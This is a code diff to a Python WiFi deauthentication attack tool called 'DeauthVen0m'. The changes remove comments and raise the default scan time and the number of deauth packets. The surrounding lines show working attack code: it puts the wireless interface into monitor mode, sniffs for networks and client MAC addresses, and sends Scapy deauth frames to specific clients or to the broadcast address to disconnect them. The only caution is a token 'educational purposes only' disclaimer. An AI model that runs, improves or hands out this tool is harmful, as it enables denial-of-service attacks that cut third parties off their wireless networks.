@@ -5,7 +5,7 @@ import threading
 from colorama import Fore, Style, init
 import pyfiglet
 
-# Initialize colorama for colored CLI output
+
 init(autoreset=True)
 
 
@@ -15,9 +15,9 @@ def show_banner():
     print(f"{Fore.CYAN}Advanced WiFi Deauth Attack Tool by DeauthVen0m\n")
     print(f"{Fore.YELLOW}Use responsibly. This tool is for educational purposes only.\n")
 
-# Tool configuration variables
-scan_time = 5
-deauth_packets = 100
+
+scan_time = 20
+deauth_packets = 500
 interval = 0.1
 burst = 10
 interface = None
@@ -25,7 +25,7 @@ networks = []
 clients = []
 vendor_cache = {}
 
-# Load MAC address prefixes for vendor info
+
 def load_vendor_info():
     global vendor_cache
     try:
@@ -36,12 +36,12 @@ def load_vendor_info():
     except FileNotFoundError:
         print(f"{Fore.RED}[-] MAC Vendor info file not found. Proceeding without vendor info.")
 
-# Get vendor from MAC
+
 def get_vendor(mac):
     prefix = mac.upper()[:8]
     return vendor_cache.get(prefix, "Unknown")
 
-# Auto-detect wireless interface
+
 def get_interface():
     global interface
     interfaces = os.popen("iw dev | grep Interface | awk '{print $2}'").read().splitlines()
@@ -52,21 +52,20 @@ def get_interface():
         print(f"{Fore.RED}[!] No wireless interface found.")
         exit()
 
-# Enable monitor mode
+
 def set_monitor_mode():
     os.system(f"ifconfig {interface} down")
     os.system(f"iwconfig {interface} mode monitor")
     os.system(f"ifconfig {interface} up")
     print(f"{Fore.GREEN}[+] {interface} set to monitor mode")
 
-# Restore managed mode
+
 def stop_monitor_mode():
     os.system(f"ifconfig {interface} down")
     os.system(f"iwconfig {interface} mode managed")
     os.system(f"ifconfig {interface} up")
     print(f"{Fore.GREEN}[+] {interface} set back to managed mode")
 
-# Scan for networks
 def scan_networks():
     print(f"{Fore.BLUE}[*] Scanning for networks...")
     networks.clear()
@@ -79,7 +78,7 @@ def scan_networks():
                 print(f"{Fore.YELLOW}[+] Network: SSID={ssid}, BSSID={bssid}")
     sniff(iface=interface, timeout=scan_time, prn=packet_handler)
 
-# Scan clients on a network
+
 def scan_clients(target_bssid):
     print(f"{Fore.BLUE}[*] Scanning for clients on {target_bssid}...")
     clients.clear()
@@ -92,7 +91,7 @@ def scan_clients(target_bssid):
                 print(f"{Fore.CYAN}[+] Client: {client}, Vendor: {vendor}")
     sniff(iface=interface, timeout=scan_time, prn=packet_handler)
 
-# Execute a deauth attack
+
 def deauth_attack(target_bssid, client_bssid="FF:FF:FF:FF:FF:FF"):
     dot11 = Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid)
     packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
@@ -102,7 +101,7 @@ def deauth_attack(target_bssid, client_bssid="FF:FF:FF:FF:FF:FF"):
         time.sleep(1)
     print(f"{Fore.GREEN}[+] Deauth attack complete.")
 
-# Save results to file
+
 def log_results():
     with open("DeauthVen0m_log.txt", "w") as f:
         for ssid, bssid in networks:
@@ -112,7 +111,7 @@ def log_results():
             f.write(f"Client MAC: {client}, Vendor: {vendor}\n")
     print(f"{Fore.GREEN}[*] Results saved to DeauthVen0m_log.txt")
 
-# Profile settings
+
 def select_attack_profile():
     global scan_time, deauth_packets, interval, burst
     print("\n--- Attack Profiles ---")
